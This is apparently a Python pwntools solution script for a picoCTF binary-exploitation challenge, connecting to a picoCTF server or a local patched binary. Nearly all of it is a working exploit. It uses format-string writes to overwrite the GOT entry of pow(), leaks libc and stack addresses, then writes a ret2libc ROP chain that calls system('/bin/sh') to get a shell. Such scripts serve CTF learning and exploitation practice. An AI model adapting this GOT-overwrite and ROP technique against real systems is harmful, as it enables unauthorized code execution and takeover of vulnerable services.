#!/usr/bin/env python3

from pwn import *

# Need to chdir (instead of using ELF("./patched/chall_patched"), etc) because
# pwninit hardcoded the interpreter of ./patched/chall_patched to ./ld-linux-x86-64.so.2
os.chdir("./patched")

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mars.picoctf.net", 31929)

    return r

def main():

    r = conn()

    ''' GOT (FOR REFERENCE, SHOWN CURRENTLY POINTING BACK TO THE PLT)
    [0x601018] puts@GLIBC_2.2.5  →  0x4006c6
    [0x601020] __stack_chk_fail@GLIBC_2.4  →  0x4006d6
    [0x601028] setbuf@GLIBC_2.2.5  →  0x4006e6
    [0x601030] printf@GLIBC_2.2.5  →  0x4006f6
    [0x601038] snprintf@GLIBC_2.2.5  →  0x400706
    [0x601040] pow@GLIBC_2.2.5  →  0x400716
    [0x601048] strcspn@GLIBC_2.2.5  →  0x400726
    [0x601050] read@GLIBC_2.2.5  →  0x400736
    [0x601058] atoi@GLIBC_2.2.5  →  0x400746
    '''

    # Define constants for the fmtstr exploit
    fmtstr_offset_bufA = 10
    fmtstr_offset_bufB = 10 + 0x100 // 8
    buf_len_before_bufA = len('Calculating for A: ')


    '''
    STEP 1: OVERWRITE GOT ENTRY OF pow()
    '''

    # Add 1 to the offset to account for the b'1AAAAAAA' payload prefix required to pass the atoi() check
    payload_1_bytes = fmtstr_payload(fmtstr_offset_bufA + 1, {exe.got.pow: exe.symbols.main}, write_size='short')
    payload_1 = bytearray(payload_1_bytes) # bytes objects are not mutable, but bytearrays are

    # Fmtstr arb-write involves writing in the no. of chars alr printed, of which some have alr been printed before our payload
    # Thus we need to subtract (buf_len_before_bufA + 8) from the no. of chars to print for the first '%Nc'
    # Note: The additional 8 is due to the b'1AAAAAAA' payload prefix
    first_spcfier_numchars = int(payload_1[1:5].decode())
    first_spcfier_numchars_modified_bytes = str(first_spcfier_numchars - (buf_len_before_bufA + 8)).encode()
    payload_1[1:5] = first_spcfier_numchars_modified_bytes

    log.info(f"{payload_1=}")

    r.sendlineafter(b'A: ', b'1' + b'A'*7 + payload_1)
    r.sendlineafter(b'B: ', b'1') # No payload for buffer B


    '''
    STEP 2: LEAK LIBC BASE ADDR (FROM GOT ENTRY) AND SAVED RBP
    '''

    #print(f"Started process with PID: {r.pid}")
    #input("Press Enter after attaching GDB...")

    # Separate the format specifiers and addresses to A and B respectively for easier crafting of the format specifier payload
    payload_2A = b'1|%' + str(fmtstr_offset_bufA + 0x310//8).encode() + b'$p' # For leaking the saved rbp
    payload_2A += b'|%' + str(fmtstr_offset_bufB + 1).encode() + b'$s' 
    payload_2B = b'1' + b'A'*7 + p64(exe.got.printf)

    r.sendlineafter(b'A: ', payload_2A + b'\x00' + b'A'*(0x100-len(payload_2A)-2)) # For some reason, in this instance payload_B was being sent together with payload_A
    r.sendlineafter(b'B: ', payload_2B)

    r.recvuntil(b'A: 1|')
    leaks = r.recvuntil(b'B: ').split(b'|')

    saved_rbp = int(leaks[0].decode(), 16)
    libc.address = u64(leaks[1][:-8].ljust(8,b'\x00')) - libc.symbols.printf

    log.info(f"{hex(libc.address)=}")
    log.info(f"{hex(saved_rbp)=}")


    '''
    STEP 3: RESTORE GOT ENTRY OF pow(), AND RET2LIBC
    '''

    # retaddr is a fixed offset from saved_rbp
    retaddr = saved_rbp - 1656 # Found by stepping through with gdb

    # Trying to run ROP(libc) keeps getting the process killed, so we have to craft the ROP chain manually
    rop_chain = b''.join([
        p64(0x400b34), # ret gadget for stack alignment
        p64(0x400b33), # pop rdi gadget
        p64(next(libc.search(b"/bin/sh\x00"))),
        p64(libc.symbols.system),
    ])

    writes = {
        exe.got.pow: 0x400716 # Restore original value in GOT table
    }
    for i in range(len(rop_chain)//8):
        writes[retaddr + i*8] = u64(rop_chain[i*8:(i+1)*8])

    # Same edits as for payload_1
    payload_3_bytes = fmtstr_payload(fmtstr_offset_bufA + 1, writes, write_size='short')
    payload_3 = bytearray(payload_3_bytes)
    first_spcfier_numchars = int(payload_3[1:5].decode())
    first_spcfier_numchars_modified_bytes = str(first_spcfier_numchars - (buf_len_before_bufA + 8)).encode()
    payload_3[1:5] = first_spcfier_numchars_modified_bytes
    
    log.info(f"{payload_3=}")

    # We need not assert that the length of the final buffer is < 0x100
    # This is because snprintf will cut off A at the first null byte, which occurs at the first address which contents will be overwritten 
    assert len(payload_3) < 0x100

    r.sendlineafter(b'A: ', b'1' + b'A'*7 + payload_3)
    r.sendlineafter(b'B: ', b'1') # No payload for buffer B

    r.interactive()



if __name__ == "__main__":
    main()
